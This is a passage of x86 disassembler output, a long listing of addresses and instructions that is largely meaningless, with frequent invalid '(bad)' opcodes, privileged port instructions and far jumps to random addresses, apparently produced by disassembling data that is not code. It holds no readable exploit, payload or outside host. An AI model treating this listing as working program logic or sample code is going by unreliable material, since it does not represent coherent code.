  415697:	call   0xbafd:0x67ff45bc
  41569e:	retf   
  41569f:	inc    eax
  4156a0:	std    
  4156a1:	scas   eax,DWORD PTR es:[edi]
  4156a2:	push   ebp
  4156a3:	mov    BYTE PTR [edi+0xdf5d05],bl
  4156a9:	add    BYTE PTR [edi],al
  4156ab:	add    DWORD PTR [eax],eax
  4156ad:	add    ah,dh
  4156af:	pop    ss
  4156b0:	fimul  DWORD PTR [eax-0x56aec6b8]
  4156b6:	cld    
  4156b7:	jb     0x415668
  4156b9:	ror    DWORD PTR [ebp+0x335c2ce],cl
  4156bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156c0:	and    BYTE PTR [esi],bh
  4156c2:	jmp    0x4156af
  4156c4:	and    al,0xd0
  4156c6:	push   edi
  4156c7:	hlt    
  4156c8:	repz out 0x1f,al
  4156cb:	pop    eax
  4156cc:	mov    bh,0xa8
  4156ce:	(bad)  
  4156cf:	push   ebp
  4156d0:	pop    edi
  4156d1:	imul   ebx,edx,0xd02aec4c
  4156d7:	and    DWORD PTR [eax],0xffffffac
  4156da:	repz inc edi
  4156dc:	dec    ebp
  4156dd:	out    dx,al
  4156de:	ror    DWORD PTR [ebx-0xf6b77a2],cl
  4156e4:	mov    BYTE PTR [edi-0x40],bl
  4156e7:	xchg   ebx,eax
  4156e8:	add    eax,0x4375302f
  4156ed:	inc    ebx
  4156ee:	lea    ebx,[ebp+0x2d]
  4156f1:	ins    BYTE PTR es:[edi],dx
  4156f2:	mov    cl,0x51
  4156f4:	aaa    
  4156f5:	xchg   ebp,eax
  4156f6:	mov    dl,0x1d
  4156f8:	mov    edi,0x8c1dd685
  4156fd:	sub    DWORD PTR [edx],eax
  4156ff:	xor    BYTE PTR [eax],ch
  415701:	ss adc eax,edi
  415704:	in     al,0xf3
  415706:	or     DWORD PTR ds:0x58c6bbdd,edx
  41570c:	ret    
  41570d:	js     0x4156b7
  41570f:	cld    
  415710:	adc    eax,0x8574663b
  415715:	push   cs
  415716:	bswap  ebx
  415718:	(bad)  
  415719:	cmp    eax,0x355b749e
  41571e:	xchg   ecx,eax
  41571f:	inc    esi
  415720:	inc    eax
  415721:	or     dh,BYTE PTR [edx+0x41]
  415724:	mov    ecx,0x78046259
  415729:	in     al,dx
  41572a:	sbb    eax,0x977070c5
  41572f:	rcl    BYTE PTR [edx],0x60
  415732:	cwde   
  415733:	fsub   st,st(5)
  415735:	xchg   ebx,eax
  415736:	loop   0x41576a
  415738:	push   esi
  415739:	inc    esp
  41573a:	ja     0x415772
  41573c:	dec    ecx
  41573d:	fild   DWORD PTR [edi+esi*1]
  415740:	bound  edi,QWORD PTR [edx]
  415742:	or     BYTE PTR [esi-0x220a4e8b],0x93
  415749:	dec    DWORD PTR [esi+0x1a]
  41574c:	mov    dl,0x40
  41574e:	adc    BYTE PTR [ebp+0x33243d94],0xaf
  415755:	(bad)  
  415756:	cmp    eax,0xef302450
  41575b:	mov    ch,0xc0
  41575d:	mov    cs,WORD PTR [ecx-0x6d]
  415760:	xchg   ebp,eax
  415761:	ja     0x4157b6
  415763:	add    BYTE PTR [edx-0x3a],0x17
  415767:	xchg   edi,ebx
  415769:	aaa    
  41576a:	repnz stc 
  41576c:	pushf  
  41576d:	inc    ecx
  41576e:	push   es
  41576f:	xchg   esi,eax
  415770:	cmp    al,0x28
  415772:	int3   
  415773:	dec    edi
  415774:	inc    esi
  415775:	and    DWORD PTR [edx],ecx
  415777:	mov    al,ds:0x9e85993a
  41577c:	sub    DWORD PTR [esi],edx
  41577e:	xchg   esp,eax
  41577f:	mov    edx,DWORD PTR [esi-0x18]
  415782:	add    eax,0xaa16c893
  415787:	push   esi
  415788:	push   ss
  415789:	xchg   ebx,eax
  41578a:	lahf   
  41578b:	dec    ebp
  41578c:	popa   
  41578d:	ror    ecx,1
  41578f:	pop    ebx
  415790:	bound  esi,QWORD PTR [ebp+0x4fc0e9fb]
  415796:	ds leave 
  415798:	(bad)  
  415799:	in     eax,dx
  41579a:	dec    esp
  41579b:	xor    DWORD PTR [esi-0x10],0xffffffb1
  41579f:	pop    esp
  4157a0:	daa    
  4157a1:	fyl2x  
  4157a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157a4:	test   DWORD PTR [ecx+eax*1+0x664a6392],0x41864ff3
  4157af:	mov    ds:0xf71da3c8,eax
  4157b4:	mov    cl,0x0
	...
  415816:	retf   
  415817:	(bad)  
  415818:	xchg   ebx,eax
  415819:	in     al,dx
  41581a:	mov    bh,0xed
  41581c:	(bad)  
  41581d:	inc    DWORD PTR [ecx-0x4151961d]
  415823:	mov    ds:0xe064610c,al
  415828:	add    BYTE PTR [eax],al
  41582a:	pop    es
  41582b:	add    DWORD PTR [eax],eax
  41582d:	add    BYTE PTR [eax],dh
  41582f:	dec    esp
  415830:	sub    ah,BYTE PTR [esi-0x78]
  415833:	inc    esi
  415834:	ficom  WORD PTR [ebx+0x60]
  415837:	jp     0x415805
  415839:	pop    eax
  41583a:	test   eax,0x99cedb11
  41583f:	inc    ecx
  415840:	xchg   ebx,eax
  415841:	mov    eax,ds:0xd9d02730
  415846:	imul   ecx,DWORD PTR [ebp+0x2f],0xe3ed70a0
  41584d:	arpl   WORD PTR [ebp+0x75],bx
  415850:	dec    eax
  415851:	jb     0x415890
  415853:	js     0x41589a
  415855:	enter  0x3640,0xf0
  415859:	add    al,0x26
  41585b:	sub    ch,dh
  41585d:	and    BYTE PTR [esi-0x12],0x82
  415861:	fld    QWORD PTR cs:[edx-0x6d]
  415865:	inc    ebx
  415866:	mov    esp,0xc96bd3f0
  41586b:	data16 mov BYTE PTR [edx*2-0x1b295a26],bh
  415873:	adc    esi,DWORD PTR [esi+0x5c286353]
  415879:	pop    edx
  41587a:	dec    ecx
  41587b:	ins    DWORD PTR es:[edi],dx
  41587c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41587d:	cdq    
  41587e:	jl     0x415899
  415880:	push   ds
  415881:	mov    esp,edx
  415883:	sbb    BYTE PTR [edx+0x46],0xd
  415887:	jp     0x415830
  415889:	xor    ch,BYTE PTR [edi]
  41588b:	xchg   ecx,eax
  41588c:	mov    ah,0x9
  41588e:	or     dh,BYTE PTR [ecx+0x712c9362]
  415894:	sub    BYTE PTR [ecx+0x606cbb0d],0x65
  41589b:	pop    es
  41589c:	pop    ebx
  41589d:	fwait
  41589e:	mov    al,0xa3
  4158a0:	js     0x4158cd
  4158a2:	sbb    BYTE PTR [ebp+0xadd510e],ch
  4158a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158a9:	repz inc edx
  4158ab:	jo     0x415929
  4158ad:	out    0x47,eax
  4158af:	cmp    dh,BYTE PTR [edx]
  4158b1:	xchg   esi,eax
  4158b2:	je     0x41586f
  4158b4:	adc    BYTE PTR [edi],bl
  4158b6:	pop    ebp
  4158b7:	iret   
  4158b8:	jge    0x415847
  4158ba:	sti    
  4158bb:	fidivr WORD PTR [ecx-0x59]
  4158be:	cli    
  4158bf:	shl    DWORD PTR [ebp+0x3086e467],cl
  4158c5:	frstor [esi-0x5a]
  4158c8:	sub    dl,dl
  4158ca:	int3   
  4158cb:	jmp    0x415927
  4158cd:	inc    ebx
  4158ce:	xor    DWORD PTR [edx-0x72],0xffffff9b
  4158d2:	push   cs
  4158d3:	jo     0x415907
  4158d5:	mov    ebp,0x981121cd
  4158da:	retf   0x4f0c
  4158dd:	(bad)  
  4158de:	push   cs
  4158df:	lods   eax,DWORD PTR ds:[esi]
  4158e0:	mov    al,0xe3
  4158e2:	add    bl,BYTE PTR [ebp+0x3]
  4158e5:	loop   0x415920
  4158e7:	mov    edx,0xcce461cc
  4158ec:	std    
  4158ed:	retf   
  4158ee:	scas   al,BYTE PTR es:[edi]
  4158ef:	ins    WORD PTR es:[edi],dx
  4158f1:	mov    esi,0x397e11a6
  4158f6:	out    0xe2,al
  4158f8:	inc    edx
  4158f9:	jmp    0x41594b
  4158fb:	xchg   dl,cl
  4158fd:	imul   edi,DWORD PTR [esi],0xcbdb4e93
  415903:	mov    bl,0x4e
  415905:	mov    dh,0x5b
  415907:	push   ebx
  415908:	fwait
  415909:	sbb    bl,ch
  41590b:	test   al,0x21
  41590d:	jecxz  0x41592d
  41590f:	xchg   BYTE PTR [edi-0x4d],ah
  415912:	cs fcmovnb st,st(4)
  415915:	inc    ebp
  415916:	push   edx
  415917:	in     al,0x3b
  415919:	dec    esp
  41591a:	sbb    DWORD PTR [eax],eax
  41591c:	sub    BYTE PTR [esi*4-0x79217577],dl
  415923:	jmp    0x91c8ac30
  415928:	mov    cl,0x35
  41592a:	or     al,al
  41592c:	adc    ah,BYTE PTR [edi+0x58c9ed1f]
  415932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415933:	fwait
  415934:	xor    eax,DWORD PTR [eax]
	...
  415996:	inc    ebp
  415997:	mov    BYTE PTR [edi+esi*2],ch
  41599a:	in     eax,dx
  41599b:	neg    DWORD PTR [edi-0x46]
  41599e:	es jge 0x415944
  4159a1:	int    0xfc
  4159a3:	adc    al,0xab
  4159a5:	and    al,0x6b
  4159a7:	loope  0x4159a9
  4159a9:	add    BYTE PTR [edi],al
  4159ab:	add    DWORD PTR [eax],eax
  4159ad:	add    BYTE PTR [ebx+eax*2-0x37],ah
  4159b1:	or     DWORD PTR [edx+0x64],esi
  4159b4:	lods   al,BYTE PTR ds:[esi]
  4159b5:	inc    ebp
  4159b6:	aad    0x88
  4159b8:	push   eax
  4159b9:	les    eax,FWORD PTR [edx]
  4159bb:	shr    BYTE PTR [edx+0x17],0x46
  4159bf:	(bad)  
  4159c0:	cmp    BYTE PTR [ecx],cl
  4159c2:	sbb    esi,ebx
  4159c4:	push   ds
  4159c5:	and    ah,BYTE PTR [ebx]
  4159c7:	je     0x415a1e
  4159c9:	fmul   QWORD PTR [eax-0x19]
  4159cc:	xor    dh,BYTE PTR [eax]
  4159ce:	push   ss
  4159cf:	adc    ebx,DWORD PTR [ebx]
  4159d1:	inc    edi
  4159d2:	jg     0x41596e
  4159d4:	hlt    
  4159d5:	dec    ebp
  4159d6:	stc    
  4159d7:	rcl    BYTE PTR [ebp+0x3c],0xc6
  4159db:	sub    DWORD PTR [edi+0x6b],edx
  4159de:	dec    ebx
  4159df:	pop    ebp
  4159e0:	sbb    BYTE PTR [edx],dh
  4159e2:	test   eax,0xa549d453
  4159e7:	lods   al,BYTE PTR ds:[esi]
  4159e8:	push   ds
  4159e9:	and    esp,DWORD PTR [esi-0x7ceb4233]
  4159ef:	sbb    esp,esi
  4159f1:	aam    0x28
  4159f3:	test   al,0x19
  4159f5:	jle    0x415a62
  4159f7:	daa    
  4159f8:	jg     0x415a61
  4159fa:	mov    cl,0x6b
  4159fc:	push   0xb
  4159fe:	and    al,0xaf
  415a00:	dec    ebp
  415a01:	ret    0xd52
  415a04:	or     BYTE PTR [edx-0x7d],dl
  415a07:	int    0x2f
  415a09:	inc    edx
  415a0a:	dec    ebp
  415a0b:	out    dx,eax
  415a0c:	cwde   
  415a0d:	xor    al,0x1f
  415a0f:	sbb    DWORD PTR [edi+0x21],0x845605d1
  415a16:	clc    
  415a17:	test   eax,0xf1f18fbb
  415a1c:	inc    edi
  415a1d:	dec    eax
  415a1e:	push   0xffffff91
  415a20:	add    DWORD PTR [esi+0x27],ebx
  415a23:	aam    0x7e
  415a25:	push   ss
  415a26:	leave  
  415a27:	retf   0x4717
  415a2a:	add    eax,0xc83cfdc0
  415a2f:	jle    0x415a89
  415a31:	popa   
  415a32:	call   0xfa3577d5
  415a37:	adc    al,0x51
  415a39:	mov    DWORD PTR [edi-0x79],ebp
  415a3c:	dec    ebx
  415a3d:	idiv   DWORD PTR [ecx+0x2]
  415a40:	lahf   
  415a41:	mov    eax,ds:0xf4bcb323
  415a46:	dec    esi
  415a47:	mov    al,0xc8
  415a49:	frstor [edi-0x14]
  415a4c:	hlt    
  415a4d:	mov    ah,0x31
  415a4f:	js     0x415a98
  415a51:	into   
  415a52:	or     BYTE PTR [edi+0x790c4ca7],dh
  415a58:	inc    edi
  415a59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a5a:	inc    DWORD PTR [ebp+eiz*8+0x6ef1630c]
  415a61:	ja     0x415ae0
  415a63:	popa   
  415a64:	ret    0xd59a
  415a67:	(bad)  
  415a68:	cmc    
  415a69:	xor    eax,0x60db2ad3
  415a6e:	jnp    0x415a85
  415a70:	push   ds
  415a71:	inc    eax
  415a72:	loop   0x415ada
  415a74:	popa   
  415a75:	add    BYTE PTR [esi+ebp*2+0x2b5f8583],dl
  415a7c:	outs   dx,BYTE PTR ds:[esi]
  415a7d:	pop    ecx
  415a7e:	in     eax,0x44
  415a80:	jl     0x415a12
  415a82:	les    ebx,FWORD PTR [edx-0x30d0fc62]
  415a88:	jmp    0x3bcb6a1b
  415a8d:	pop    ecx
  415a8e:	mov    al,0x16
  415a90:	lahf   
  415a91:	fcmovu st,st(7)
  415a93:	and    esp,DWORD PTR [esi]
  415a95:	xor    BYTE PTR [esi],ch
  415a97:	inc    eax
  415a98:	jg     0x415a60
  415a9a:	in     eax,dx
  415a9b:	add    esi,esp
  415a9d:	rcl    edx,1
  415a9f:	sbb    eax,0xfef49951
  415aa4:	nop
  415aa5:	adc    BYTE PTR [esi],bh
  415aa7:	imul   ebp,DWORD PTR [edi],0xffffffc5
  415aaa:	cdq    
  415aab:	cwde   
  415aac:	jecxz  0x415aa0
  415aae:	iret   
  415aaf:	push   edx
  415ab0:	int    0xe6
  415ab2:	dec    edx
  415ab3:	sub    BYTE PTR [ebp+0x0],dl
	...
  415b16:	fistp  QWORD PTR [esi-0x449a6dfb]
  415b1c:	(bad)  
  415b1e:	jge    0x415aff
  415b20:	nop
  415b21:	mov    al,ds:0xdf9503d8
  415b26:	jb     0x415b0a
  415b28:	add    BYTE PTR [eax],al
  415b2a:	pop    es
  415b2b:	add    DWORD PTR [eax],eax
  415b2d:	add    BYTE PTR [ecx+0xe],dh
  415b30:	leave  
  415b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b32:	fadd   st(2),st
  415b34:	mov    WORD PTR [eax],ds
  415b36:	stc    
  415b37:	sti    
  415b38:	jne    0x415afa
  415b3a:	gs and al,0x5f
  415b3d:	int3   
  415b3e:	cmpxchg BYTE PTR [edx],al
  415b41:	pop    eax
  415b42:	and    al,0x4f
  415b44:	xchg   BYTE PTR [edx+0x73],dh
  415b47:	aad    0xb5
  415b49:	jno    0x415b14
  415b4b:	cmp    esi,DWORD PTR [ecx]
  415b4d:	dec    esp
  415b4e:	adc    ch,BYTE PTR [edx]
  415b50:	or     esi,ebx
  415b52:	push   0x73
  415b54:	or     DWORD PTR [edi+0x4affdb78],0xfffffff0
  415b5b:	pusha  
  415b5c:	(bad)  
  415b5d:	(bad)  
  415b5f:	sbb    eax,0xc2977002
  415b64:	aaa    
  415b65:	pop    edx
  415b66:	sbb    DWORD PTR [ecx+0x747e7bea],0x38
  415b6d:	and    eax,0xb17f6c31
  415b72:	push   es
  415b73:	dec    esi
  415b74:	xor    al,0xb1
  415b76:	add    BYTE PTR [edx+0x51],0x54
  415b7a:	out    dx,al
  415b7b:	mov    eax,edi
  415b7d:	adc    al,0x82
  415b7f:	push   esp
  415b80:	mov    esp,0x30593e1e
  415b85:	enter  0x9134,0xa0
  415b89:	cli    
  415b8a:	lds    esp,FWORD PTR [ebp+0x2d]
  415b8d:	jae    0x415b3b
  415b8f:	xor    BYTE PTR [eax+0x3ca8f569],0x82
  415b96:	fld    DWORD PTR [ebx-0x7ca8cd16]
  415b9c:	nop
  415b9d:	xlat   BYTE PTR ds:[ebx]
  415b9e:	dec    edi
  415b9f:	(bad)  
  415ba0:	(bad)  
  415ba2:	setl   BYTE PTR [edx+0x4c347d42]
  415ba9:	mov    edi,0x7d0188d4
  415bae:	fdiv   DWORD PTR ds:0xe3723319
  415bb4:	repnz mov eax,0x84745847
  415bba:	cmp    bh,BYTE PTR [edi-0x1a05fe41]
  415bc0:	mov    esi,0x35fafbfb
  415bc5:	push   esi
  415bc6:	and    ebp,DWORD PTR [ecx-0x6ffb12]
  415bcc:	daa    
  415bcd:	cld    
  415bce:	loop   0x415b6e
  415bd0:	pop    edi
  415bd1:	clc    
  415bd2:	into   
  415bd3:	in     eax,0xcb
  415bd5:	(bad)  
  415bd6:	clc    
  415bd7:	mov    dl,0xd2
  415bd9:	adc    al,0x95
  415bdb:	mov    dl,0x5
  415bdd:	or     DWORD PTR [esi-0x6d6a9f11],ebx
  415be3:	stos   BYTE PTR es:[edi],al
  415be4:	and    ebp,DWORD PTR [edi]
  415be6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415be7:	sub    cl,BYTE PTR [ecx-0x11]
  415bea:	sbb    DWORD PTR [esi-0x71],esi
  415bed:	pop    edi
  415bee:	dec    ecx
  415bef:	add    DWORD PTR [ebx-0x7d],0x6d3e7a15
  415bf6:	scas   al,BYTE PTR es:[edi]
  415bf7:	xor    cl,BYTE PTR [edx]
  415bf9:	adc    al,dl
  415bfb:	sub    eax,0xe8e59b5
  415c00:	jl     0x415c70
  415c02:	retf   
  415c03:	(bad)  
  415c04:	cli    
  415c05:	add    dl,bl
  415c07:	cmp    DWORD PTR [edx+0x40],0xffffffda
  415c0b:	mov    eax,ds:0xa595e8e7
  415c10:	stos   BYTE PTR es:[edi],al
  415c11:	mov    ebx,0x5dc04d12
  415c16:	or     al,0x5c
  415c18:	xor    cl,BYTE PTR [eax+ebp*2+0x4f4be0f1]
  415c1f:	mov    ebx,0xfb9d088c
  415c24:	mov    edi,fs
  415c26:	out    0xeb,eax
  415c28:	in     eax,0xa
  415c2a:	push   0x69
  415c2c:	sbb    al,0xe3
  415c2e:	mov    edi,0xa8345c8d
  415c33:	jmp    0x415d27
	...
  415c94:	add    BYTE PTR [eax],al
  415c96:	cmp    dl,BYTE PTR [eax]
  415c98:	mov    edi,0xbbbfbf3c
  415c9d:	push   ss
  415c9e:	jno    0x415d07
  415ca0:	mov    esi,0xd784f20f
  415ca5:	clc    
  415ca6:	jns    0x415c8b
  415ca8:	add    BYTE PTR [eax],al
  415caa:	pop    es
  415cab:	add    DWORD PTR [eax],eax
  415cad:	add    dh,ch
  415caf:	test   DWORD PTR [edi],ebp
  415cb1:	jbe    0x415cbc
  415cb3:	cld    
  415cb4:	jl     0x415cf6
  415cb6:	cwde   
  415cb7:	(bad)  
  415cb8:	cmp    DWORD PTR [edi],ebx
  415cba:	xchg   edx,eax
  415cbb:	and    BYTE PTR [ebp-0x5f74a02f],cl
  415cc1:	in     eax,dx
  415cc2:	div    DWORD PTR [ecx]
  415cc4:	shr    BYTE PTR [edi+0x71],0x3e
  415cc8:	(bad)  
  415cc9:	out    dx,al
  415cca:	and    bh,BYTE PTR [eax]
  415ccc:	frstor [eax]
  415cce:	jle    0x415c51
  415cd0:	pop    es
  415cd1:	js     0x415c60
  415cd3:	ficom  DWORD PTR [ebx+eax*8+0x2ff68570]
  415cda:	and    ecx,eax
  415cdc:	pop    ebx
  415cdd:	or     al,0x4d
  415cdf:	retf   
  415ce0:	sbb    bl,BYTE PTR [edi]
  415ce2:	outs   dx,DWORD PTR ds:[esi]
  415ce3:	xor    al,BYTE PTR [ebx-0x266dd396]
  415ce9:	jecxz  0x415d61
  415ceb:	xchg   ebp,eax
  415cec:	arpl   WORD PTR [edx-0x17],si
  415cef:	bound  edi,QWORD PTR [eax-0x66]
  415cf2:	and    BYTE PTR [edx-0x52c62ccc],bh
  415cf8:	mov    edi,0x89222b43
  415cfd:	int    0x8d
  415cff:	test   eax,0xcf456f24
  415d04:	fild   DWORD PTR [esp+edi*4-0x61]
  415d08:	and    eax,0x5e6fccff
  415d0d:	xchg   BYTE PTR [edi+0x396cd316],dl
  415d13:	jno    0x415d59
  415d15:	or     BYTE PTR [eax],dh
  415d17:	push   ebp
  415d18:	aad    0xc
  415d1a:	aas    
  415d1b:	pop    ebx
  415d1c:	adc    dl,bl
  415d1e:	sub    BYTE PTR [ebp-0x6],ch
  415d21:	dec    eax
  415d22:	pop    eax
  415d23:	ds xchg ebp,eax
  415d25:	ret    0xcb06
  415d28:	jne    0x415ccb
  415d2a:	mov    ebx,0x855bdc5c
  415d2f:	mov    eax,ds:0xd7f93b2f
  415d34:	inc    ecx
  415d35:	les    esi,FWORD PTR [esi-0x22e91a5c]
  415d3b:	out    dx,al
  415d3c:	fadd   DWORD PTR [ecx+0x71437946]
  415d42:	jae    0x415d88
  415d44:	in     al,dx
  415d45:	mov    edx,0x4ce5a030
  415d4a:	add    al,0x2b
  415d4c:	add    dh,dl
  415d4e:	dec    esi
  415d4f:	inc    esi
  415d50:	inc    edx
  415d51:	addr16 mov esp,0x426e2409
  415d57:	push   es
  415d58:	lea    ebx,[edi+edx*2-0x31]
  415d5c:	mov    cl,0xcc
  415d5e:	adc    al,0x31
  415d60:	and    BYTE PTR [edx-0x2e],0x84
  415d64:	add    edi,edi
  415d66:	mov    cl,0x6
  415d68:	or     ch,BYTE PTR [ebp+edx*2+0x62]
  415d6c:	push   edx
  415d6d:	sbb    esp,DWORD PTR [ecx-0x7ff9113f]
  415d73:	cmp    esp,DWORD PTR [ebp-0x5c]
  415d76:	dec    esi
  415d77:	xchg   ebp,eax
  415d78:	fild   QWORD PTR [esp+esi*2+0xff70793]
  415d7f:	inc    esp
  415d80:	ficomp DWORD PTR [edx-0x3f]
  415d83:	dec    eax
  415d84:	mov    cl,0xec
  415d86:	gs cdq 
  415d88:	pushf  
  415d89:	mov    WORD PTR [edx],gs
  415d8b:	in     eax,dx
  415d8c:	mov    bh,0x46
  415d8e:	sbb    eax,DWORD PTR [edi+0x368c6d0a]
  415d94:	mov    esp,0xccdad782
  415d99:	push   ebx
  415d9a:	mov    eax,ds:0x6998697a
  415d9f:	int3   
  415da0:	not    esi
  415da2:	sub    DWORD PTR [edx],edx
  415da4:	ror    ebp,1
  415da6:	dec    ecx
  415da7:	sbb    edi,DWORD PTR [ecx]
  415da9:	psubsb mm6,QWORD PTR [esi+0x4f]
  415dad:	fistp  WORD PTR [ebp+0x4e302d1a]
  415db3:	fisttp QWORD PTR [eax]
	...
  415e15:	add    dh,ch
  415e17:	repnz cmc 
  415e19:	add    edi,ebp
  415e1b:	pop    es
  415e1c:	(bad)  
  415e1d:	call   DWORD PTR [eax]
  415e1f:	mov    eax,ds:0x97f05606
  415e24:	push   ecx
  415e25:	pop    esp
  415e26:	and    ah,0x0
  415e29:	add    BYTE PTR [edi],al
  415e2b:	add    DWORD PTR [eax],eax
  415e2d:	add    BYTE PTR [eax],dl
  415e2f:	enter  0xcf50,0xd1
  415e33:	mov    ah,0xee
  415e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e36:	outs   dx,BYTE PTR ds:[esi]
  415e37:	mov    ds:0x2d7bc061,al
  415e3c:	adc    BYTE PTR [esi],ah
  415e3e:	jle    0x415dde
  415e40:	aaa    
  415e41:	xchg   esi,eax
  415e42:	or     dh,BYTE PTR [eax]
  415e44:	div    bl
  415e46:	nop
  415e47:	push   esp
  415e48:	adc    DWORD PTR [esi],edx
  415e4a:	clc    
  415e4b:	jmp    0xd68999b2
  415e50:	add    al,0xbe
  415e52:	pop    eax
  415e53:	or     BYTE PTR [ebx+0x12],bl
  415e56:	xor    eax,0x26f8ae1c
  415e5b:	cmp    edx,DWORD PTR [ebx+0x1e]
  415e5e:	xchg   ebx,eax
  415e5f:	lods   eax,DWORD PTR ds:[esi]
  415e60:	ror    DWORD PTR [eax+ebp*1+0x2be49e7d],0xfc
  415e68:	popa   
  415e69:	retf   0x3075
  415e6c:	push   edx
  415e6d:	repnz stc 
  415e6f:	jne    0x415e9a
  415e71:	pop    ecx
  415e72:	adc    DWORD PTR [eax],0x13d5fdb0
  415e78:	inc    edi
  415e79:	jb     0x415ede
  415e7b:	dec    ebp
  415e7c:	jmp    0xbf5b:0x3577c74c
  415e83:	not    DWORD PTR ds:0x5cb87054
  415e89:	or     ch,BYTE PTR [esi]
  415e8b:	test   al,0xc3
  415e8d:	test   al,0x74
  415e8f:	add    eax,0x3a91a44f
  415e94:	jae    0x415e19
  415e96:	mov    bl,0x25
  415e98:	lods   eax,DWORD PTR ds:[esi]
  415e99:	imul   BYTE PTR fs:[edx-0xbf3328b]
  415ea0:	jo     0x415e50
  415ea2:	cmp    esp,DWORD PTR [edi-0x57cdc72f]
  415ea8:	dec    edx
  415ea9:	xchg   BYTE PTR [ebx],dh
  415eab:	and    eax,0x1a7f14ca
  415eb0:	icebp  
  415eb1:	jmp    0x415f24
  415eb3:	mov    ebp,0xe9511ed1
  415eb8:	ja     0x415ef9
  415eba:	push   esi
  415ebb:	mov    al,0x22
  415ebd:	imul   ebx,DWORD PTR [edi+0x4e],0xee0fca09
  415ec4:	cmp    eax,0x9e300b02
  415ec9:	test   DWORD PTR [ecx+ecx*2+0x3876a05f],eax
  415ed0:	or     ebp,DWORD PTR [ebp+0x5776781a]
  415ed6:	adc    al,0x4
  415ed8:	ins    BYTE PTR es:[edi],dx
  415ed9:	adc    edi,esp
  415edb:	sbb    BYTE PTR [edi-0x9ef35b2],cl
  415ee1:	je     0x415eea
  415ee3:	jno    0x415ec0
  415ee5:	pop    esi
  415ee6:	(bad)  
  415ee7:	jmp    0x47ba:0xc9a77ab7
  415eee:	or     BYTE PTR [edx-0x5a85d643],0xbd
  415ef5:	lock dec esp
  415ef7:	add    BYTE PTR [ecx-0x50b28c91],dl
  415efd:	dec    edi
  415efe:	call   0x58d355e
  415f03:	adc    al,0x61
  415f05:	mov    bl,ah
  415f07:	jae    0x415f2d
  415f09:	xchg   ebx,eax
  415f0a:	cmp    DWORD PTR [edi],esi
  415f0c:	es or  dh,cl
  415f0f:	scas   eax,DWORD PTR es:[edi]
  415f10:	out    dx,al
  415f11:	adc    DWORD PTR [ebp-0x47],0x5e
  415f15:	loopne 0x415f77
  415f17:	repz je 0x415ef9
  415f1a:	xor    ebx,DWORD PTR [esi]
  415f1c:	das    
  415f1d:	jle    0x415f65
  415f1f:	inc    ecx
  415f20:	dec    esp
  415f21:	or     ebp,ebx
  415f23:	sahf   
  415f24:	inc    ecx
  415f25:	jbe    0x415f2f
  415f27:	jno    0x415f5f
  415f29:	mov    al,BYTE PTR [edx]
  415f2b:	iret   
  415f2c:	out    0xac,eax
  415f2e:	mov    esp,0x222c8764
  415f33:	push   esi
  415f34:	and    eax,0x0
	...
  415f95:	add    BYTE PTR [edi],dl
  415f97:	mov    BYTE PTR [esi-0x6e],ch
  415f9a:	push   esi
  415f9c:	dec    DWORD PTR [ebp+0x1b0aa13e]
  415fa2:	lock das 
  415fa4:	clc    
  415fa5:	fld    QWORD PTR [edi+0x70000e5]
  415fab:	add    DWORD PTR [eax],eax
  415fad:	add    BYTE PTR [ebp+0x3c945bde],bh
  415fb3:	xchg   ebx,eax
  415fb4:	adc    DWORD PTR [edx],eax
  415fb6:	cmp    BYTE PTR [esi],cl
  415fb8:	pop    esi
  415fb9:	test   DWORD PTR [esp+eax*4+0x43],esi
  415fbd:	inc    ecx
  415fbe:	dec    ecx
  415fbf:	enter  0x1444,0xbe
  415fc3:	je     0x41603b
  415fc5:	inc    esi
  415fc6:	mov    eax,0x5c7e1db7
  415fcb:	leave  
  415fcc:	xor    dl,BYTE PTR [edx+0x7b]
  415fcf:	lea    esi,[ebx]
  415fd1:	xor    al,0x4b
  415fd3:	mov    ecx,0xee1439f7
  415fd8:	xchg   edi,eax
  415fd9:	xor    BYTE PTR [ebx],dh
  415fdb:	arpl   WORD PTR [ebx-0x5bd96634],ax
  415fe1:	pop    ss
  415fe2:	stos   BYTE PTR es:[edi],al
  415fe3:	fldcw  WORD PTR [edx-0x53]
  415fe6:	or     bh,al
  415fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fe9:	sub    al,0x9b
  415feb:	fisttp WORD PTR [esi+0x22]
  415fee:	mov    al,ds:0xfa637815
  415ff3:	mov    dl,BYTE PTR [esi+0x51f1f2c2]
  415ff9:	cmp    eax,0x734f0aec
  415ffe:	mov    dl,0xfe
  416000:	mov    ebp,0xb2e6ec78
  416005:	sbb    al,0x9f
  416007:	rol    DWORD PTR [ebx-0x350d29f1],0xf6
  41600e:	and    eax,ebx
  416010:	pop    DWORD PTR [ebp+ebx*2-0x47]
  416014:	cdq    
  416015:	push   esp
  416016:	loop   0x416019
  416018:	xchg   ecx,eax
  416019:	int3   
  41601a:	outs   dx,BYTE PTR ds:[esi]
  41601b:	aad    0x26
  41601d:	xchg   esi,eax
  41601e:	sub    eax,0x7cbf9135
  416023:	cli    
  416024:	sub    al,0x2e
  416026:	xchg   ebx,eax
  416027:	sub    DWORD PTR [edi+0x42],ebx
  41602a:	das    
  41602b:	fdivr  DWORD PTR [edi-0x4a37695c]
  416031:	jmp    0x6bf0:0x15c84ded
  416038:	or     DWORD PTR ds:[edi+ecx*8+0x13],esp
  41603d:	mov    ecx,0x3997d82b
  416042:	dec    BYTE PTR [esi]
  416044:	rcl    DWORD PTR [eax-0x6e],cl
  416047:	fwait
  416048:	rcr    BYTE PTR [ecx],1
  41604a:	mov    al,0xfc
  41604c:	outs   dx,DWORD PTR ds:[esi]
  41604d:	pop    ebx
  41604e:	dec    esp
  41604f:	xchg   edi,eax
  416050:	ja     0x416058
  416052:	cs jmp 0xa8:0xc4051577
  41605a:	and    ebx,DWORD PTR ds:0xf179f528
  416060:	leave  
  416061:	add    DWORD PTR [edx+edi*8+0x612c2c2a],0x8
  416069:	scas   eax,DWORD PTR es:[edi]
  41606a:	push   ecx
  41606b:	ds stos BYTE PTR es:[edi],al
